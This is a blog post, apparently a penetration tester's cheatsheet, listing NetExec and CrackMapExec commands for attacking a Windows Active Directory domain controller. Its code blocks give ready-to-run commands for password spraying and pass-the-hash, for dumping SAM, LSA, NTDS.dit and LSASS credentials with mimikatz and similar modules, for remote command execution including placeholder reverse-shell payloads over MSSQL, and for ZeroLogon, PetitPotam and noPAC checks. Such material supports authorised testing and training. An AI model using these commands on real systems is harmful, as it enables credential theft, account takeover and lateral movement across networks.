---
layout: post
title:  NetExec and CrackMapExec Cheatsheet
description: Cheatsheet for NetExec and CrackMapExec
date:   2024-11-02 07:00:00 +0300
image:  '/images/20.jpg'
tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB, Credential-Dumping]
---
<span style="font-size: smaller;">**Disclaimer**: This cheatsheet is regularly updated to ensure accuracy; however, due to updates and evolving tools, some commands may no longer work or may have alternative methods of running them. Please verify commands as needed and consult official documentation or additional resources if a command does not perform as expected.</span>

# Table of Contents
- [Getting NetExec and CrackMapExec](#getting-netexec-and-crackmapexec)
- [NetExec Commands](#netexec-commands)
  - [nxc Enumeration](#nxc-enumeration)
  - [nxc Checking Credentials & Password Spraying](#nxc-checking-credentials--password-spraying)
  - [nxc Dumping Credentials](#nxc-dumping-credentials)
  - [nxc Command Execution](#nxc-command-execution)
  - [nxc Testing CVEs](#nxc-testing-cves)
- [CrackMapExec Commands](#crackmapexec-commands)
  - [cme Enumeration](#cme-enumeration)
  - [cme Checking Credentials & Password Spraying](#cme-checking-credentials--password-spraying)
  - [cme Dumping Credentials](#cme-dumping-credentials)
  - [cme Command Execution](#cme-command-execution)

# Getting NetExec and CrackMapExec
We can install NetExec on Kali Linux using the following command:
```shell
sudo apt install netexec
```
CrackMapExec comes pre-installed on Kali Linux by default. However, if installation is required, the following command can be used:
```shell
sudo apt install crackmapexec
```

Important Note: I primarily use NetExec as it is the updated version of CrackMapExec. However, there are situations where trying both tools can be beneficial to minimize the risk of false negatives and false positives.

# NetExec Commands
The IP address 172.16.150.20 will be used as an example for the Domain Controller (DC01) IP address.
## nxc Enumeration
```shell
# Enumerating Network (Find active reachable hosts)
nxc smb 172.16.150.0/24

# Null Session (Access without Credentials)
nxc smb 172.16.150.20 -u '' -p ''
netexec smb 10.129.132.249 -u '' -p '' -d "DC=active,DC=htb"

# Shares
nxc smb 172.16.150.20 -u john -p 'Password123!' --shares

# Shares with Spider Plus
nxc smb 172.16.150.20 -u john -p 'Password123!' -M spider_plus

# Shares with Spider Plus with Dump on Kali (Avoid running it with /24 IP range)
nxc smb 172.16.150.20 -u john -p 'Password123!' -M spider_plus -o READ_ONLY=False

# Domain Password Policy
nxc smb 172.16.150.20 -u john -p 'Password123!' --pass-pol

# Domain Users
nxc smb 172.16.150.20 -u john -p 'Password123!' --users

# Logged Users
nxc smb 172.16.150.20 -u john -p 'Password123!' --loggedon-users

# RID
nxc smb 172.16.150.20 -u john -p 'Password123!' --rid-brute

# Groups
nxc smb 172.16.150.20 -u john -p 'Password123!' --groups

# Local Groups
nxc smb 172.16.150.20 -u john -p 'Password123!' --local-groups

# Sessions
nxc smb 172.16.150.20 -u john -p 'Password123!' --sessions

# Disk
nxc smb 172.16.150.20 -u john -p 'Password123!' --disks

# RDP
nxc rdp 172.16.150.20 -u john -p 'Password123!'
nxc rdp 172.16.150.20 -u john -p 'Password123!' --local-auth

# WinRM
nxc winrm 172.16.150.20 -u john -p 'Password123!'
nxc winrm 172.16.150.20 -u john -p 'Password123!' --local-auth

# MSSQL
nxc mssql 172.16.150.20 -u john -p 'Password123!'
nxc mssql 172.16.150.20 -u john -p 'Password123!' --local-auth
```
## nxc Checking Credentials & Password Spraying
Important Note: Always check Domain Password Policy before Password Spraying to prevent Account Lockouts.
```shell
# Check Credentials - with Password
nxc smb 172.16.150.20 -u john -p 'Password123!'

# Check Credentials - with Hash
nxc smb 172.16.150.20 -u john -H 'NT_HASH'
nxc smb 172.16.150.20 -u john -H 'LM_HASH:NT_HASH'

# Password Spraying
nxc smb 172.16.150.20 -u john jane marcus -p 'Password123!'
nxc smb 172.16.150.20 -u john -p 'Password123!' 'PleaseDontHackMe' '1337H4x0r'
nxc smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt
nxc smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt --continue-on-success

# Local Authentication
nxc smb 172.16.150.20 -u john -p 'Password123!' --local-auth
nxc smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt --local-auth

# RDP
nxc rdp ips_internal.txt -u john -p 'Password123!' --continue-on-success
nxc rdp ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth

# WinRM
nxc winrm ips_internal.txt -u john -p 'Password123!' --continue-on-success
nxc winrm ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth

# MSSQL
nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success
nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth
```

## nxc Dumping Credentials
```shell
# SAM
nxc smb 172.16.150.20 -u john -p 'Password123!' --sam

# LSA
nxc smb 172.16.150.20 -u john -p 'Password123!' --lsa

# NTDS.DIT RPC
nxc smb 172.16.150.20 -u john -p 'Password123!' --ntds

# NTDS.DIT VSS
nxc smb 172.16.150.20 -u john -p 'Password123!' --ntds vss

# LSASS
nxc smb 172.16.150.20 -u john -p 'Password123!' -M lsassy
nxc smb 172.16.150.20 -u john -p 'Password123!' -M mimikatz
nxc smb 172.16.150.20 -u john -p 'Password123!' -M nanodump
nxc smb 172.16.150.20 -u john -p 'Password123!' -M procdump

# LAPS Password
nxc ldap 172.16.150.20 -u john -p 'Password123!' -M laps -o computer=172.16.150.120
```

## nxc Command Execution
```shell
# CMD
nxc smb 172.16.150.20 -u john -p 'Password123!' -x "whoami"

# PowerShell
nxc smb 172.16.150.20 -u john -p 'Password123!' -x "whoami"

# MSSQL
nxc mssql 172.16.150.20 -u john -p 'Password123!' -x "whoami"
nxc mssql 172.16.150.20 -u john -p 'Password123!' -x "Enter PowerShell#3 (Base64) Reverse Shell from revshells.com here"
```

## nxc Testing CVEs
```shell
# ZeroLogon
nxc smb 172.16.150.20 -u '' -p '' -M zerologon

# PetitPotam
nxc smb 172.16.150.20 -u '' -p '' -M petitpotam

# noPAC
nxc smb 172.16.150.20 -u '' -p '' -M nopac
```

# CrackMapExec Commands
As of 2024, CrackMapExec is deprecated, and I primarily use NetExec. However, there are still some cases where CrackMapExec remains useful. Below are the commands I use most frequently:
## cme Enumeration
```shell
# Enumerating Network (Find active reachable hosts)
crackmapexec smb 172.16.150.0/24

# Null Session (Access without Credentials)
crackmapexec smb 172.16.150.20 -u '' -p ''

# Shares
crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --shares

# Domain Password Policy
crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --pass-pol

# Domain Users
crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --users
```
## cme Checking Credentials & Password Spraying
```shell
# Check Credentials - with Password
crackmapexec smb 172.16.150.20 -u john -p 'Password123!'

# Check Credentials - with Hash
crackmapexec smb 172.16.150.20 -u john -H 'NT_HASH'
crackmapexec smb 172.16.150.20 -u john -H 'LM_HASH:NT_HASH'

# Password Spraying
crackmapexec smb 172.16.150.20 -u john jane marcus -p 'Password123!'
crackmapexec smb 172.16.150.20 -u john -p 'Password123!' 'PleaseDontHackMe' '1337H4x0r'
crackmapexec smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt
crackmapexec smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt --continue-on-success

# Local Authentication
crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --local-auth
crackmapexec smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt --local-auth
```

## cme Dumping Credentials
```shell
# SAM
crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --sam

# LSA
crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --lsa

# NTDS.DIT RPC
crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --ntds

# NTDS.DIT VSS
crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --ntds vss
```

## cme Command Execution
```shell
# CMD
crackmapexec smb 172.16.150.20 -u john -p 'Password123!' -x "whoami"

# PowerShell
crackmapexec smb 172.16.150.20 -u john -p 'Password123!' -x "whoami"

# MSSQL
crackmapexec mssql 172.16.150.20 -u john -p 'Password123!' -x "whoami"
crackmapexec mssql 172.16.150.20 -u john -p 'Password123!' -x "Enter PowerShell#3 (Base64) Reverse Shell from revshells.com here"

# MSSQL with Domain Parameter
crackmapexec mssql 172.16.150.20 -d automotors.local -u john -p 'Password123!' -x "Enter PowerShell#3 (Base64) Reverse Shell from revshells.com here"
```

